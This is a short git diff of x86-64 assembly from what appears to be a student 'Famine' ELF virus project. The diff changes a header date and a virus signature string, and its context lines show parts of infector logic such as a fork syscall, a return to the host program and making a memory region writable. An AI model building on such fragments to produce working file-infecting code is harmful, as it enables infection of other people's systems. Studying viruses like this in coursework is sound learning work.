@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/14 11:42:40 by spolowy          ###   ########.fr        ;
+;    Updated: 2019/06/15 17:30:07 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -17,6 +17,7 @@
 %define PROT_RWX		0x07
 %define CALL_INSTR_SIZE		0x05
 %define SYSCALL_FORK		0x39
+
 section .text
 	global famine_entry
 	global _start
@@ -30,7 +31,7 @@ famine_entry:
 	call mark_below
 	db "128 bit key here", "rel ptld", "ptldsize", "relvirus"
 	db "relentry", "virusize"
-	db "64 bit signature here. A green mouse running in grass ! ~~(__^·>"
+	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
 ;------------------------------; Get variables address
 ; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
 ; | rdx  | r8          | r9          | r10         | r11          | r14        |
@@ -103,7 +104,6 @@ mark_below:
 	syscall
 	test rax, rax
 	jnz return_to_client
-
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
